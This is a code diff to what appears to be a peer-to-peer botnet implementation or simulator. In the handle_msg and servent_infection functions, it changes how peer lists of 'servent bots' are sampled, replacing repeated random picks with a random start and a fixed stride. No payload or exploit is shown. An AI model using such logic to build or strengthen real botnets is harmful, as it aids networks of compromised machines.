@@ -1311,8 +1311,9 @@ int handle_msg(_socket *client, string msg_data, HOST *this_host) {
                         }
                         set<HOST *, HOSTPtrComp>::iterator bot_i;
                         output = "Peerlist";
+                        random_num = (rand() * rand()) % my_list.size();
                         while (random_list.empty() || random_list.size() < PLSIZE - 1) {
-                            random_num = (rand() * rand()) % my_list.size();
+                            random_num = (random_num + (int)(my_list.size() / PLSIZE)) % my_list.size();
                             bot_i = my_list.begin();
                             advance(bot_i, random_num);
                             random_list.insert(*bot_i);
@@ -1324,7 +1325,7 @@ int handle_msg(_socket *client, string msg_data, HOST *this_host) {
                             advance(bot_i, random_num);
                             random_list.insert(*bot_i);
                         } else {
-                            random_num = (rand() * rand()) % my_list.size();
+                            random_num = (random_num + (int)(my_list.size() / PLSIZE)) % my_list.size();
                             bot_i = my_list.begin();
                             advance(bot_i, random_num);
                             random_list.insert(*bot_i);
@@ -1411,8 +1412,9 @@ int handle_msg(_socket *client, string msg_data, HOST *this_host) {
                         output = "Change:ServentBot";
                         set<HOST *, HOSTPtrComp> my_list(servent_bot_set.begin(), servent_bot_set.end());
                         set<HOST *, HOSTPtrComp>::iterator bot_i;
+                        random_num = (rand() * rand()) % my_list.size();
                         while (random_list.empty() || random_list.size() < PLSIZE - 1) {
-                            random_num = (rand() * rand()) % my_list.size();
+                            random_num = (random_num + (int)(my_list.size() / PLSIZE)) % my_list.size();
                             bot_i = my_list.begin();
                             advance(bot_i, random_num);
                             random_list.insert(*bot_i);
@@ -1424,7 +1426,7 @@ int handle_msg(_socket *client, string msg_data, HOST *this_host) {
                             advance(bot_i, random_num);
                             random_list.insert(*bot_i);
                         } else {
-                            random_num = (rand() * rand()) % my_list.size();
+                            random_num = (random_num + (int)(my_list.size() / PLSIZE)) % my_list.size();
                             bot_i = my_list.begin();
                             advance(bot_i, random_num);
                             random_list.insert(*bot_i);
@@ -1633,8 +1635,9 @@ int servent_infection(bool *console) {
                 send_data = "Change:ServentBot";
                 set<HOST *, HOSTPtrComp> my_list(servent_bot_set.begin(), servent_bot_set.end());
                 set<HOST *, HOSTPtrComp>::iterator bot_i;
+                random_num = (rand() * rand()) % my_list.size();
                 while (random_list.empty() || random_list.size() < PLSIZE - 1) {
-                    random_num = (rand() * rand()) % my_list.size();
+                    random_num = (random_num + (int)(my_list.size() / PLSIZE)) % my_list.size();
                     bot_i = my_list.begin();
                     advance(bot_i, random_num);
                     random_list.insert(*bot_i);
@@ -1646,7 +1649,7 @@ int servent_infection(bool *console) {
                     advance(bot_i, random_num);
                     random_list.insert(*bot_i);
                 } else {
-                    random_num = (rand() * rand()) % my_list.size();
+                    random_num = (random_num + (int)(my_list.size() / PLSIZE)) % my_list.size();
                     bot_i = my_list.begin();
                     advance(bot_i, random_num);
                     random_list.insert(*bot_i);
